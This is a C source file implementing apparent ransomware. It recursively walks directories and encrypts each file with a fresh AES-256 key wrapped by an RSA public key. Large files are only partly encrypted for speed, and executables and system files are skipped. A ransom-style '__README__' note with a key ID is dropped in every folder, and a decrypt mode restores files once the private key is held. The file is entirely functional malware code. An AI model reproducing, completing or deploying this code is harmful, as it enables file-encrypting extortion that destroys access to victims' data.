#include "extclib/crypto.h"

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include <dirent.h>
#include <sys/stat.h>

#include <openssl/rand.h>
#include <openssl/sha.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>

/* CONSTS */
#define HSIZE 64
#define KSIZE 32
#define BSIZE 16

#define BUFSIZ_2K (2 << 10)
#define BUFSIZ_4K (4 << 10)

#define ENCRYPT_MODE  1
#define DECRYPT_MODE -1

/* SETTINGS */
#define README
#define INCOMPLETE
#define EXTENSIONS

/* PARAMS */
#define README_FILE         "__README__"
#define README_TEXT         "hello, friend"
#define ENCKEY_EXTN         ".key"
#define BLOCK_EXTENSIONS    { ".exe", ".dll", ".bat", ".ini", ".sys" }
#define LIMIT_FSIZE         (8 << 20) // 8*(2^20)b = 8MiB

extern int path_encrypt(int mode, const char *pathname, RSA *key);
extern int file_encrypt(int mode, const char *pathname, const char *filename, const char *key);

static int _file_encrypt(int mode, FILE *output, FILE *input, const char *key, char *iv);
static int _incmplt_file_encrypt(int mode, const char *fullname, const char *key, size_t fs);
static int _openskeyfile(int mode, const char *pathname, const char *filename, RSA *key, char *skey);
static void _part_file_encrypt(int mode, FILE *fp, size_t begin, char *buffer, const char *key, const char *iv);

static void _tochars(char *output, size_t size);
static _Bool _is_dir(const char *pathname);
static _Bool _file_exist(const char *filename);
static size_t _file_size(const char *filename);

extern int path_encrypt(int mode, const char *pathname, RSA *key) {
#ifdef EXTENSIONS
    const char *extens[] = BLOCK_EXTENSIONS;
#endif
#ifdef README
    FILE *readme;
    char hash[HSIZE+1];
#endif
    DIR *dir;
    size_t fs;
    struct dirent *d;
    char fullname[BUFSIZ_4K];
    char skey[KSIZE];
    _Bool need_pass;

    dir = opendir(pathname);
    if (dir == NULL) {
        return 1;
    }

#ifdef README
    snprintf(fullname, BUFSIZ_4K, "%s/%s", pathname, README_FILE);
    if (mode == ENCRYPT_MODE && !_file_exist(fullname)) {
        crypto_rsa_hashpub(hash, key);
        readme = fopen(fullname, "w");
        if (readme != NULL) {
            fprintf(readme, "%s\n%s\n%s\n\n%s\n%s\n%s\n\n", 
                "-----BEGIN UID KEY-----", hash, "-----END UID KEY-----",
                "-----BEGIN MESSAGE-----", README_TEXT, "-----END MESSAGE-----");
            PEM_write_RSAPublicKey(readme, key);
            fclose(readme);
        }
    }   
#endif

    while ((d = readdir(dir)) != NULL) {
        snprintf(fullname, BUFSIZ_4K, "%s/%s", pathname, d->d_name);
        if (_is_dir(fullname)) {
            if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0) {
                continue;
            }
            path_encrypt(mode, fullname, key);
            continue;
        }
#ifdef README
        if (strcmp(README_FILE, d->d_name) == 0) {
            continue;
        }
#endif
#ifdef EXTENSIONS
        need_pass = 0;
        for (size_t i = 0; i < sizeof(extens)/sizeof(extens[0]); ++i) {
            if (strstr(d->d_name, extens[i]) != NULL) {
                need_pass = 1;
                break;
            }
        }
        if (need_pass) {
            continue;
        }
#endif
        if (strstr(d->d_name, ENCKEY_EXTN) != NULL) {
            continue;
        }
        need_pass = _openskeyfile(mode, pathname, d->d_name, key, skey);
        if (need_pass) {
            continue;
        }
        fs = _file_size(fullname);
        // printf("[%s][%ldB] %s\n", (mode) ? "ENCRYPT" : "DECRYPT", fs, fullname);
#ifdef INCOMPLETE
        if (fs > LIMIT_FSIZE) {
            _incmplt_file_encrypt(mode, fullname, skey, fs);
            continue;
        }
#endif
        file_encrypt(mode, pathname, d->d_name, skey);
    }

#ifdef README
    snprintf(fullname, BUFSIZ_4K, "%s/%s", pathname, README_FILE);
    if (mode == DECRYPT_MODE && _file_exist(fullname)) {
        remove(fullname);
    }
#endif
    closedir(dir);
    return 0;
}

extern int file_encrypt(int mode, const char *pathname, const char *filename, const char *key) {
    char tempfile[BUFSIZ_4K];
    char fullname[BUFSIZ_4K];
    char tempname[BSIZE];
    char iv[BSIZE];
    FILE *input, *output;
    int rc;

    snprintf(fullname, BUFSIZ_4K, "%s/%s", pathname, filename);
    input = fopen(fullname, "rb");
    if (input == NULL) {
        return 1;
    }

    crypto_rand(tempname, BSIZE);
    _tochars(tempname, BSIZE);
    tempname[BSIZE-1] = '\0';

    snprintf(tempfile, BUFSIZ_4K, "%s/%s", pathname, tempname);
    output = fopen(tempfile, "wb");
    if (output == NULL) {
        fclose(input);
        return 2;
    }

    switch (mode) {
        case ENCRYPT_MODE:
            crypto_rand(iv, BSIZE);
            fwrite(iv, sizeof(uint8_t), BSIZE, output);
            rc = _file_encrypt(ENCRYPT_MODE, output, input, key, iv);
        break;
        case DECRYPT_MODE:
            fread(iv, sizeof(uint8_t), BSIZE, input);
            rc = _file_encrypt(DECRYPT_MODE, output, input, key, iv);
        break;
    }
    
    fclose(input);
    fclose(output);

    rename(tempfile, fullname);
    return rc;
}


static int _incmplt_file_encrypt(int mode, const char *fullname, const char *key, size_t fs) {
    char buffer[BUFSIZ_2K];
    char iv[KSIZE];
    FILE *input;
    
    input = fopen(fullname, "rb+");
    if (input == NULL) {
        return 1;
    }

    // memset(iv, 0, BSIZE);
    crypto_sha_256(iv, key, KSIZE);

    // BEGIN: 0
    _part_file_encrypt(mode, input, 0, buffer, key, iv);

    // MIDDLE: F/2, F/4, F/6, F/8
    for (size_t i = 2; i <= 8; i += 2) {
        _part_file_encrypt(mode, input, fs/i, buffer, key, iv);
    }

    // END: F-B
    _part_file_encrypt(mode, input, fs-BUFSIZ_4K, buffer, key, iv);

    fclose(input);
    return 0;
}

static int _openskeyfile(int mode, const char *pathname, const char *filename, crypto_rsa *key, char *skey) {
    FILE *file;
    char enckey[BUFSIZ_4K];
    char buffer[BUFSIZ_2K];
    
    snprintf(enckey, BUFSIZ_4K, "%s/%s%s", pathname, filename, ENCKEY_EXTN);
    switch(mode) {
        case ENCRYPT_MODE:
            if (_file_exist(enckey)) {
                return 1;
            }
            file = fopen(enckey, "wb");
            if (file == NULL) {
                return 1;
            }
            crypto_rand(skey, KSIZE);
            crypto_rsa_oaep(mode, key, buffer, BUFSIZ_2K, skey, KSIZE);
            fwrite(buffer, sizeof(uint8_t), crypto_rsa_size(key), file);
            fclose(file);
        break;
        case DECRYPT_MODE:
            file = fopen(enckey, "rb");
            if (file == NULL) {
                return 1;
            }
            fread(buffer, sizeof(char), crypto_rsa_size(key), file);
            crypto_rsa_oaep(mode, key, buffer, BUFSIZ_2K, buffer, RSA_size(key));
            memcpy(skey, buffer, KSIZE);
            fclose(file);
            remove(enckey);
        break;
    }
    return 0;
}

static void _tochars(char *output, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        output[i] = (output[i] % 26) + 65;
    }
}

static _Bool _is_dir(const char *pathname) {
    struct stat path_stat;
    stat(pathname, &path_stat);
    return S_ISDIR(path_stat.st_mode);
}

static _Bool _file_exist(const char *filename) {
    FILE *file = fopen(filename, "rb");
    if (file != NULL) {
        fclose(file);
        return 1;
    }
    return 0;
}

static size_t _file_size(const char *filename) {
    struct stat file_stat;
    stat(filename, &file_stat);
    return file_stat.st_size;
}

static int _file_encrypt(int mode, FILE *output, FILE *input, const char *key, char *iv){
    uint8_t inbuf[BUFSIZ_2K];
    uint8_t outbuf[BUFSIZ_2K + BSIZE];

    int rb, wb;
    EVP_CIPHER_CTX *ctx;

    ctx = EVP_CIPHER_CTX_new();
    if(ctx == NULL){
        return -1;
    }

    if(!EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL, mode)){
        return -2;
    }

    OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == KSIZE);
    OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == BSIZE);

    if(!EVP_CipherInit_ex(ctx, NULL, NULL, (uint8_t*)key, (uint8_t*)iv, mode)) {
        EVP_CIPHER_CTX_cleanup(ctx);
        return -3;
    }

    while(1){
        rb = fread(inbuf, sizeof(unsigned char), BUFSIZ_2K, input);
        if (ferror(input)){
            EVP_CIPHER_CTX_cleanup(ctx);
            return -4;
        }
        if(!EVP_CipherUpdate(ctx, outbuf, &wb, inbuf, rb)){
            EVP_CIPHER_CTX_cleanup(ctx);
            return -5;
        }
        fwrite(outbuf, sizeof(unsigned char), wb, output);
        if (ferror(output)) {
            EVP_CIPHER_CTX_cleanup(ctx);
            return -6;
        }
        if (rb < BUFSIZ_2K) {
            break;
        }
    }

    if(!EVP_CipherFinal_ex(ctx, outbuf, &wb)){
        EVP_CIPHER_CTX_cleanup(ctx);
        return -7;
    }

    fwrite(outbuf, sizeof(unsigned char), wb, output);

    if (ferror(output)) {
        EVP_CIPHER_CTX_cleanup(ctx);
        return -8;
    }

    EVP_CIPHER_CTX_cleanup(ctx);
    return 0;
}

static void _part_file_encrypt(int mode, FILE *fp, size_t begin, char *buffer, const char *key, const char *iv) {
    fseek(fp, begin, SEEK_SET);
    fread(buffer, sizeof(uint8_t), BUFSIZ_2K, fp);

    crypto_aes_256cbc(mode, key, buffer, buffer, BUFSIZ_2K, iv);

    fseek(fp, begin, SEEK_SET);
    fwrite(buffer, sizeof(uint8_t), BUFSIZ_2K, fp);
}
